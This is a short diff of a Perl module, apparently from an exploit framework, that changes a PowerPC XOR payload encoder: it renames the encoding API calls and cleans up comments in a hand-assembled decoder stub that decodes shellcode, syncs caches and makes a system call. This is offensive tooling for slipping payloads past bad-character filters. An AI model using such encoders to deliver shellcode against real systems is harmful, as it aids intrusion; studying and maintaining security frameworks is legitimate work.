@@ -38,31 +38,31 @@ sub EncodePayload {
     my $payload  = shift;
     my $badchars = shift;
 
-    my $xor_key   = Pex::Encoder::XorKeyScanDword($payload, $badchars);
-    my $xor_data  = Pex::Encoder::XorDword($xor_key, $payload);
+    my $xor_key   = Pex::Encoding::XorDword->KeyScan($payload, $badchars);
+    my $xor_data  = Pex::Encoding::XorDword->Encode($xor_key, $payload);
 
     my $encoder = pack("N*", 
         0x7c631a79,  # xor.      r3,r3,r3
         0x4082fffd,  # bnel      0
         0x7da802a6,  # mflr      r13
-        0x38c3e041,  # addi      r6,r3,-8127    # 14
-        0x39800440,  # li        r12,1088       # 18
+        0x38c3e041,  # addi      r6,r3,-8127
+        0x39800440,  # li        r12,1088
         0x39ad1fff,  # addi      r13,r13,8191
-        0x81cde045,  # lwz       r14,-8123(r13) # 26
-        0x81ede041,  # lwz       r15,-8127(r13) # 30
+        0x81cde045,  # lwz       r14,-8123(r13)
+        0x81ede041,  # lwz       r15,-8127(r13)
         0x7def7278,  # xor       r15,r15,r14
-        0x91ede041,  # stw       r15,-8127(r13) # 38
+        0x91ede041,  # stw       r15,-8127(r13) 
         0x7c0668ac,  # dcbf      r6,r13
         0x7c0104ac,  # sync
         0x7c066fac,  # icbi      r6,r13
         0x4c01012c,  # isync    
         0x39adfffc,  # addi      r13,r13,-4
-        0x398cfef0,  # addi      r12,r12,-272   # 62
+        0x398cfef0,  # addi      r12,r12,-272 
         0x7d8c6379,  # mr.       r12,r12
         0x4082ffd8,  # bne+      decode_loop
-	0x3be030ff,  # li        r31, 0x30ff
+        0x3be030ff,  # li        r31, 0x30ff
      	0x7fe04e70,  # srawi     r0, r31, 9
-	0x44ffff02,  # sc
+        0x44ffff02,  # sc
         0x7c631a79,  # xor.      r3,r3,r3
         0x7c631a79,  # xor.      r3,r3,r3
         0x7c631a79,  # xor.      r3,r3,r3
